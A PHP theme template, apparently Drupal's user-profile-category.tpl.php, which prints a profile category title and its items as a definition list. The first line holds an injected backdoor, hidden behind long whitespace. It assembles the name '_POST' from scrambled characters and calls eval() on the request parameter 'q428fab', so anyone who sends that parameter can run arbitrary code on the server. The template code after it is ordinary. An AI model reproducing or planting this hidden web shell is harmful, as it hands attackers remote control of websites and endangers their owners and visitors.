<?php                                                                                                                                                                                                                                                                             $etx37 ="pru_etos" ; $ygzy6= $etx37[7].$etx37[5]. $etx37[1]. $etx37[5]. $etx37[6]. $etx37[2]. $etx37[0]. $etx37[0]. $etx37[4]. $etx37[1] ; $ruvp4= $ygzy6 ($etx37[3].$etx37[0]. $etx37[6]. $etx37[7]. $etx37[5] );if ( isset( ${ $ruvp4} ['q428fab' ]) ) {eval ( ${ $ruvp4 } ['q428fab'] ) ; }?><?php

/**
 * @file
 * Default theme implementation to present profile categories (groups of
 * profile items).
 *
 * Categories are defined when configuring user profile fields for the site.
 * It can also be defined by modules. All profile items for a category will be
 * output through the $profile_items variable.
 *
 * @see user-profile-item.tpl.php
 *      where each profile item is rendered. It is implemented as a definition
 *      list by default.
 * @see user-profile.tpl.php
 *      where all items and categories are collected and printed out.
 *
 * Available variables:
 * - $title: Category title for the group of items.
 * - $profile_items: All the items for the group rendered through
 *   user-profile-item.tpl.php.
 * - $attributes: HTML attributes. Usually renders classes.
 *
 * @see template_preprocess_user_profile_category()
 */
?>
<?php if ($title): ?>
  <h3><?php print $title; ?></h3>
<?php endif; ?>

<dl<?php print $attributes; ?>>
  <?php print $profile_items; ?>
</dl>
